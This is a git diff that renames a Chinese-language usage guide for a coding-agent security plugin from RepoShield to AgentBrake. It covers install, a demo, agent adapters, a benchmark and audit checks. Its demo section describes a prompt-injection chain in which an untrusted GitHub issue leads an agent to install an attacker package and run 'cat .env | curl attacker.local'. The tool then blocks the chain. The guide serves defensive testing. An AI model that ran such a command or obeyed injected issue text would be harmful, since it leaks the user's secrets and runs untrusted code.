@@ -1,9 +1,9 @@
-# RepoShield v0.2 第二阶段使用说明
+# AgentBrake v0.2 第二阶段使用说明
 
 ## 1. 安装与验证
 
 ```bash
-cd reposhield_plugin_v0.2
+cd agentbrake_plugin_v0.2
 pip install -e '.[test]'
 pytest -q
 ```
@@ -17,7 +17,7 @@ pytest -q
 ## 2. 运行固定攻击链 demo
 
 ```bash
-PYTHONPATH=src python -m reposhield demo --workdir /tmp/reposhield_demo
+PYTHONPATH=src python -m agentbrake demo --workdir /tmp/agentbrake_demo
 ```
 
 demo 会创建一个最小 Node 仓库，模拟不可信 GitHub issue 诱导 reference agent：
@@ -27,18 +27,18 @@ issue / PR prompt injection
 → npm install github:attacker/helper-tool
 → postinstall / secret / network 风险
 → cat .env | curl attacker.local
-→ RepoShield 阻断
+→ AgentBrake 阻断
 → benign edit + npm test 保留
 ```
 
 验证审计链：
 
 ```bash
-PYTHONPATH=src python -m reposhield audit-verify --audit /tmp/reposhield_demo/audit.jsonl
-PYTHONPATH=src python -m reposhield replay-verify --bundle /tmp/reposhield_demo/replay_bundle
-PYTHONPATH=src python -m reposhield incident-report \
-  --audit /tmp/reposhield_demo/audit.jsonl \
-  --output /tmp/reposhield_demo/incident.html
+PYTHONPATH=src python -m agentbrake audit-verify --audit /tmp/agentbrake_demo/audit.jsonl
+PYTHONPATH=src python -m agentbrake replay-verify --bundle /tmp/agentbrake_demo/replay_bundle
+PYTHONPATH=src python -m agentbrake incident-report \
+  --audit /tmp/agentbrake_demo/audit.jsonl \
+  --output /tmp/agentbrake_demo/incident.html
 ```
 
 ## 3. 使用 adapter 运行外部/模拟 coding agent
@@ -56,7 +56,7 @@ RS_ACTION: npm test
 运行：
 
 ```bash
-reposhield run-agent \
+agentbrake run-agent \
   --adapter generic \
   --repo ./repo \
   --task '修复登录按钮点击无响应的问题，并运行测试' \
@@ -75,7 +75,7 @@ READ: <path>
 ### aider adapter
 
 ```bash
-reposhield run-agent \
+agentbrake run-agent \
   --adapter aider \
   --repo ./repo \
   --task '修复登录按钮点击无响应的问题，并运行测试'
@@ -88,13 +88,13 @@ reposhield run-agent \
 生成 40 个第二阶段样本：
 
 ```bash
-reposhield generate-stage2-samples --output samples_stage2 --count 40
+agentbrake generate-stage2-samples --output samples_stage2 --count 40
 ```
 
 运行：
 
 ```bash
-reposhield bench-suite --samples samples_stage2 --output out/bench
+agentbrake bench-suite --samples samples_stage2 --output out/bench
 ```
 
 输出：
@@ -108,7 +108,7 @@ out/bench/RS-V2-*/replay_bundle/
 
 ## 5. 安全决策解释
 
-RepoShield 的每个动作都会经过：
+AgentBrake 的每个动作都会经过：
 
 ```text
 SourceRecord / ContextGraph
